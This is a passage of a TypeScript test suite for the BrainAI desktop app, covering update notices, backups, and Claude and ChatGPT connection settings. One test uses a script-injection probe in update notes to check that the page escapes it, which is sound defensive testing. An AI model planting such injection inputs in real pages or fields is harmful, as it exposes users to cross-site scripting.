  const j = await (await fetch(app.baseUrl + '/models/progress', { headers: { Cookie: cookie } })).json() as { busy: boolean; line: string };
  assert.equal(j.busy, true);
});

test('step 2 does not hash the model files: installed means the files are there', async (t) => {
  const dir = mkdtempSync(join(tmpdir(), 'brainai-inst-'));
  const bytes = Buffer.from('x');
  const m = { id: 'e5', kind: 'search', label: 'Light', repo: 'example-org/e5-tiny', files: { 'm.bin': 'f'.repeat(64) }, bytes: 1, licence: 'MIT', measured: 'x', profile: 'e5' } as CatalogueModel;
  const db = openDb(':memory:');
  const manager = new RealManager({ dataDir: dir, modelsDir: dir, embedder: new SwitchableEmbedder(db, GEMMA_PROFILE), reranker: new SwitchableReranker(), db, dbPath: ':memory:', catalogue: [m], log: () => {} });
  assert.deepEqual(await manager.installedIds(), []);
  mkdirSync(join(dir, 'example-org/e5-tiny'), { recursive: true });
  writeFileSync(join(dir, 'example-org/e5-tiny/m.bin'), bytes); // wrong content: a hash check would refuse it
  assert.deepEqual(await manager.installedIds(), ['e5']);
});

// ---- The update card on Home, Later, and the backup before an update ----

const KEY = 'a-made-up-app-key';
async function startUpdate(t: TestContext, opts: { localMode?: boolean; backupDir?: string } = {}) {
  const f = fakeHome();
  t.after(() => f.cleanup());
  const statusDir = mkdtempSync(join(tmpdir(), 'brainai-status-'));
  writeFileSync(join(statusDir, 'welcome-done'), '');
  const app = await startTestApp({ localMode: opts.localMode ?? true, noPassword: true, statusDir, appSecret: KEY, backupDir: opts.backupDir, tools: { home: f.home, path: `${f.bin}:${dirname(process.execPath)}:/usr/bin:/bin`, apps: f.apps } });
  t.after(() => app.close());
  return { app, statusDir };
}
const putUpdate = (dir: string, u: Record<string, unknown>) => writeFileSync(join(dir, 'update.json'), JSON.stringify({ current: '0.0.1', version: '99.1.0', notes: '- Faster search\n- Fewer crashes', state: 'available', ...u }));

test('Home shows the update card with notes as list items, Update and restart, and Later', async (t) => {
  const { app, statusDir } = await startUpdate(t);
  putUpdate(statusDir, {});
  const home = await openPage(app.baseUrl, '/');
  assert.match(home.body, /BrainAI 99\.1\.0 is ready \(you have 0\.0\.1\)/);
  assert.match(home.body, /<li>Faster search<\/li>/);
  assert.match(home.body, /<li>Fewer crashes<\/li>/);
  assert.match(home.body, /<a[^>]*href="\/app\/update"[^>]*>Update and restart<\/a>/);
  assert.match(home.body, /<form[^>]*action="\/app\/update\/later"/);
});

test('a wrapped bullet in an older update.json shows as one list item', async (t) => {
  const { app, statusDir } = await startUpdate(t);
  putUpdate(statusDir, { notes: '- Lead-in: a made-up sentence that wraps\n  onto a second line\n  and a third.\n- Other' });
  const home = await openPage(app.baseUrl, '/');
  assert.match(home.body, /<li>Lead-in: a made-up sentence that wraps onto a second line and a third\.<\/li>/);
  assert.match(home.body, /<li>Other<\/li>/);
});

test('notes in the update card are escaped', async (t) => {
  const { app, statusDir } = await startUpdate(t);
  putUpdate(statusDir, { notes: '- <script>alert(1)</script>' });
  const home = await openPage(app.baseUrl, '/');
  assert.ok(!home.body.includes('<script>alert(1)'));
  assert.match(home.body, /&lt;script&gt;alert\(1\)&lt;\/script&gt;/);
});

test('Later hides the card for that version, and a newer version shows it again', async (t) => {
  const { app, statusDir } = await startUpdate(t);
  putUpdate(statusDir, {});
  const first = await openPage(app.baseUrl, '/');
  const r = await post(app.baseUrl, '/app/update/later', first.cookie);
  assert.equal(r.status, 303);
  assert.equal(r.headers.get('location'), '/');
  assert.ok(!(await openPage(app.baseUrl, '/', first.cookie)).body.includes('is ready (you have'));
  putUpdate(statusDir, { version: '99.2.0' });
  assert.match((await openPage(app.baseUrl, '/', first.cookie)).body, /BrainAI 99\.2\.0 is ready/);
});

test('a failed update shows Try again, and the state route says the line', async (t) => {
  const { app, statusDir } = await startUpdate(t);
  putUpdate(statusDir, { state: 'failed', problem: 'No space left.' });
  const home = await openPage(app.baseUrl, '/');
  assert.match(home.body, /<a[^>]*href="\/app\/update"[^>]*>Try again<\/a>/);
  const s = await fetch(app.baseUrl + '/app/update/state', { headers: { Cookie: home.cookie } });
  const j = await s.json() as { text: string; failed: boolean };
  assert.equal(j.failed, true);
  assert.match(j.text, /No space left\./);
});

test('an update the app cannot install itself offers the download page, not Update and restart', async (t) => {
  const { app, statusDir } = await startUpdate(t);
  putUpdate(statusDir, { state: 'blocked', problem: 'BrainAI is running from the disk image. Move BrainAI to Applications and open it again.' });
  const home = await openPage(app.baseUrl, '/');
  assert.match(home.body, /Move BrainAI to Applications/);
  assert.doesNotMatch(home.body, /href="\/app\/update"/);
  assert.match(home.body, /<a[^>]*href="https:\/\/github\.com\/jsr1292\/brainai\/releases\/latest"[^>]*>Download BrainAI 99\.1\.0<\/a>/);
});

test('no update file, or a server, shows no card', async (t) => {
  const { app, statusDir } = await startUpdate(t);
  assert.ok(!(await openPage(app.baseUrl, '/')).body.includes('is ready (you have'));
  putUpdate(statusDir, {});
  const server = await startUpdate(t, { localMode: false });
  putUpdate(server.statusDir, {});
  assert.ok(!(await openPage(server.app.baseUrl, '/')).body.includes('is ready (you have'));
  assert.equal((await fetch(server.app.baseUrl + '/app/backup-now', { method: 'POST', headers: { 'X-App-Key': KEY } })).status, 404);
});

test('/app/update, when the app did not intercept it, tells how to update', async (t) => {
  const { app } = await startUpdate(t);
  const p = await openPage(app.baseUrl, '/app/update');
  assert.match(p.body, /Update BrainAI/);
  assert.match(p.body, /use Update and restart in BrainAI&#39;s own window|use Update and restart in BrainAI's own window/);
  assert.ok(!p.body.includes('reopens by itself') && !p.body.includes('is updating'));
});

test('POST /app/backup-now needs the app key, writes a backup, and says plainly when it cannot', async (t) => {
  const backupDir = mkdtempSync(join(tmpdir(), 'brainai-backups-'));
  const { app } = await startUpdate(t, { backupDir });
  const none = await fetch(app.baseUrl + '/app/backup-now', { method: 'POST' });
  const wrong = await fetch(app.baseUrl + '/app/backup-now', { method: 'POST', headers: { 'X-App-Key': 'nope' } });
  const unknown = await fetch(app.baseUrl + '/no-such-page-here');
  assert.equal(none.status, unknown.status);
  assert.equal(wrong.status, unknown.status);
  assert.equal(readdirSync(backupDir).filter((f) => f.startsWith('memory-')).length, 0);
  const ok = await fetch(app.baseUrl + '/app/backup-now', { method: 'POST', headers: { 'X-App-Key': KEY } });
  assert.equal(ok.status, 200);
  assert.deepEqual(await ok.json(), { ok: true });
  assert.equal(readdirSync(backupDir).filter((f) => f.startsWith('memory-')).length, 1);

  const blocker = join(mkdtempSync(join(tmpdir(), 'brainai-blocker-')), 'a-file');
  writeFileSync(blocker, 'x');
  const bad = await startUpdate(t, { backupDir: join(blocker, 'sub') });
  const failed = await fetch(bad.app.baseUrl + '/app/backup-now', { method: 'POST', headers: { 'X-App-Key': KEY } });
  assert.equal(failed.status, 500);
  const body = await failed.json() as { error: string };
  assert.ok(body.error.length > 0);
  assert.ok(!body.error.includes(bad.statusDir), 'no data folder path');
});

const CHATGPT = "ChatGPT's app can't reach a brain that lives only on this computer.";

async function startWith(t: TestContext, tools: { platform?: NodeJS.Platform; claude?: boolean }) {
  const f = fakeHome([]);
  t.after(() => f.cleanup());
  if (tools.claude) mkdirSync(join(f.apps, 'Claude.app'));
  writeFileSync(join(f.home, 'bridge-cli.js'), '');
  const statusDir = mkdtempSync(join(tmpdir(), 'brainai-status-'));
  const app = await startTestApp({ localMode: true, noPassword: true, statusDir, tools: { home: f.home, path: `${f.bin}:/usr/bin:/bin`, apps: f.apps, platform: tools.platform, system: {}, claudeConfig: join(f.home, CLAUDE_CONFIG), bridgeCli: join(f.home, 'bridge-cli.js') } });
  t.after(() => app.close());
  return { app, f };
}

test("Claude's desktop app has a Connect row in Settings and the welcome when it is installed, and connects with its own key", async (t) => {
  const { app, f } = await startWith(t, { claude: true });
  const s = await openPage(app.baseUrl, '/settings');
  for (const path of ['/settings/tools', '/welcome?step=3']) {
    const body = (await openPage(app.baseUrl, path, s.cookie)).body;
    assert.match(body, /Claude \(desktop app\)/, path);
    assert.match(body, /action="\/settings\/tools\/claude-desktop\/connect"/, path);
  }
  const r = await post(app.baseUrl, '/settings/tools/claude-desktop/connect', s.cookie);
  assert.equal(r.status, 303);
  const cfg = JSON.parse(f.read('Library/Application Support/Claude/claude_desktop_config.json')!) as { mcpServers: { brainai: { command: string; args: string[]; env: Record<string, string> } } };
  assert.equal(cfg.mcpServers.brainai.command, process.execPath);
  assert.equal(cfg.mcpServers.brainai.args[1], 'claude-bridge');
  assert.ok(cfg.mcpServers.brainai.env.BRAINAI_DATA_DIR && cfg.mcpServers.brainai.env.BRAINAI_PORT_FILE.endsWith('brainai.json'));
  assert.ok(app.deps.provider.listGrants().some((g) => g.clientName === 'Claude (desktop app)' && !g.revokedAt), 'a grant shows in Connections');
  const after = await openPage(app.baseUrl, r.headers.get('location')!, s.cookie);
  assert.match(after.body, /Quit Claude completely/);
});

test("Claude's desktop app has no row when it is not installed", async (t) => {
  const { app } = await startWith(t, { claude: false });
  const s = await openPage(app.baseUrl, '/settings');
  const tools = (await openPage(app.baseUrl, '/settings/tools', s.cookie)).body;
  assert.doesNotMatch(tools, /action="\/settings\/tools\/claude-desktop\/connect"/);
});

test('the ChatGPT row says what its app can reach, has no Connect button, and differs on Windows', async (t) => {
  for (const [platform, extra] of [['darwin', 'Turn on Reach from phone and web, then add BrainAI in ChatGPT on the web.'], ['win32', 'Put BrainAI on a server to use it from ChatGPT.']] as const) {
    const { app } = await startWith(t, { platform });
    const s = await openPage(app.baseUrl, '/settings');
    for (const path of ['/settings/tools', '/welcome?step=3']) {
      const body = (await openPage(app.baseUrl, path, s.cookie)).body.replace(/&#39;/g, "'").replace(/<[^>]+>/g, '');
      assert.match(body, /ChatGPT/, `${platform} ${path}`);
      assert.ok(body.includes(CHATGPT), `${platform} ${path}`);
      assert.ok(body.includes(extra), `${platform} ${path}`);
      assert.ok(!body.includes(platform === 'darwin' ? 'Put BrainAI on a server' : 'Turn on Reach'), `${platform} ${path}`);
      assert.doesNotMatch(body, /chatgpt\/connect/);
    }
  }
});

test('on a server neither the Claude (desktop app) nor the ChatGPT row exists, also when signed in', async (t) => {
  const server = await startTestApp({ localMode: false });
  t.after(() => server.close());
  const as = await loggedIn(server);
  for (const path of ['/settings', '/settings/tools', '/welcome?step=3']) {
    const res = await as(path);
    const body = res.status === 200 ? await res.text() : '';
    if (path === '/settings') assert.equal(res.status, 200);
    assert.doesNotMatch(body, /Claude \(desktop app\)|ChatGPT's app can|ChatGPT's app can&#39;t/, path);
  }
  assert.equal((await as('/settings/tools')).status, 404);
});

test("revoking Claude's desktop app on the Connections page deletes its key file, and its row then says it needs connecting again", async (t) => {
  const { app, f } = await startWith(t, { claude: true });
  const s = await openPage(app.baseUrl, '/settings');
  await post(app.baseUrl, '/settings/tools/claude-desktop/connect', s.cookie);
  const keyFile = join(app.deps.statusDir!, 'claude-desktop-key');
  assert.ok(existsSync(keyFile));
  const grant = app.deps.provider.listGrants().find((g) => g.clientName === 'Claude (desktop app)')!;
  const row = async () => (await openPage(app.baseUrl, '/settings/tools', s.cookie)).body;
  assert.match(await row(), /Connected/);
  assert.equal((await post(app.baseUrl, `/clients/${grant.id}/revoke`, s.cookie)).status, 303);
  assert.equal(existsSync(keyFile), false);
  const body = await row();
  assert.match(body, /Needs connecting again/);
  assert.doesNotMatch(body, /Uses another BrainAI/);
  assert.match(body, /action="\/settings\/tools\/claude-desktop\/connect"/);
  assert.equal((await post(app.baseUrl, '/settings/tools/claude-desktop/connect', s.cookie)).status, 303);
  assert.match(await row(), /Connected/);
  assert.ok(f.read(CLAUDE_CONFIG));
});

test('a revoked key and a changed address both count as not live', async (t) => {
  const { app } = await startWith(t, { claude: true });
  const p = app.deps.provider;
  const { grantId } = p.issueLocalGrant({ name: 'Claude (desktop app)', clientName: 'Claude (desktop app)' });
  assert.equal(p.isLocalGrantLive(grantId, `${app.baseUrl}/mcp`), true);
  assert.equal(p.isLocalGrantLive(grantId, 'http://localhost:1/mcp'), false, 'another address (a port change)');
  p.revokeGrant(grantId);
  assert.equal(p.isLocalGrantLive(grantId, `${app.baseUrl}/mcp`), false);
  assert.equal(p.isLocalGrantLive('no-such-grant', `${app.baseUrl}/mcp`), false);
});

test('the Tools page keeps its lede true for the new rows, and ChatGPT points at Reach (Mac) or Move (Windows)', async (t) => {
  for (const [platform, link] of [['darwin', '/settings/reach'], ['win32', '/settings/move']] as const) {
    const { app } = await startWith(t, { platform, claude: true });
    const s = await openPage(app.baseUrl, '/settings');
    for (const path of ['/settings/tools', '/welcome?step=3']) {
      const body = (await openPage(app.baseUrl, path, s.cookie)).body;
      assert.doesNotMatch(body, /Each tool (then )?signs in once/, path);
      assert.match(body, /uit Claude completely/, `${path}: Claude's own note`);
      const chat = /<li class="tool">(?:(?!<\/li>)[\s\S])*ChatGPT(?:(?!<\/li>)[\s\S])*<\/li>/.exec(body)![0];
      assert.ok(chat.includes(`href="${link}"`), `${platform} ${path}`);
    }
  }
});
